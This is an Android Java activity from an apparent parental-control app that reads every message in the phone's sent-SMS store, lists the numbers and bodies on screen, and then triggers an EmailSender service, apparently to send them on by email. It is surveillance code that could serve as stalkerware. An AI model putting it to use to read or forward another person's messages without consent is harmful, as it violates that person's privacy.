package parentalcontrol.parent.GUI;

import parentalcontrol.parent.R;
import parentalcontrol.parent.com.Internet.EmailSender;
import android.app.Activity;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.widget.TextView;

public class SMSSendActivity extends Activity {

	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.smssendlayout);

		TextView phonenum = (TextView) findViewById(R.id.tvsmssend);
		TextView msgbody = (TextView) findViewById(R.id.etmsgbody);

		Uri uriSMSURI = Uri.parse("content://sms/sent");
		Cursor cur = getContentResolver().query(uriSMSURI, null, null, null,
				null);
		String sms = "";
		while (cur.moveToNext()) {
			phonenum.setText(cur.getString(2));
			sms += "From :" + cur.getString(2) + " : " + cur.getString(12)
					+ "\n";
		}
		msgbody.setText(sms);
		
		startService(new Intent(getBaseContext(), EmailSender.class));
		
		stopService(new Intent(getBaseContext(), EmailSender.class));
	}
}
